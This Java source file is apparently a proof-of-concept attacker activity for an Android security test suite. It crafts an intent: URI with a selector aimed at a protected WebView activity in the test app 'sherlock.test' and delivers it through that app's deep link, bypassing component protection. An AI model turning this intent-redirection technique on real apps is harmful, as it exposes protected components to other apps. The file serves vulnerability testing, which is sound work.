package sherlock.poc.unsafe_intent_uri.webview;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class BasicDeeplinkActivity extends AppCompatActivity {

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, BasicDeeplinkActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setSelector(new Intent().setClassName("sherlock.test", "sherlock.test.protected_components.ProtectedWebViewActivity"));
        target.putExtra("url", "https://www.netflix.com");

        String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);
        String url = Uri.encode("https://sherlock-93f40.web.app/?url=" + Uri.encode(intentUri));

        Intent i = new Intent("android.intent.action.VIEW");
        i.setData(Uri.parse("sherlock://webview.intent.uri.basic.deeplink/unsafe?url=" + url));
        i.setClassName("sherlock.test", "sherlock.test.unsafe_intent_uri.webview.BasicDeeplinkActivity");
        startActivity(i);
    }
}
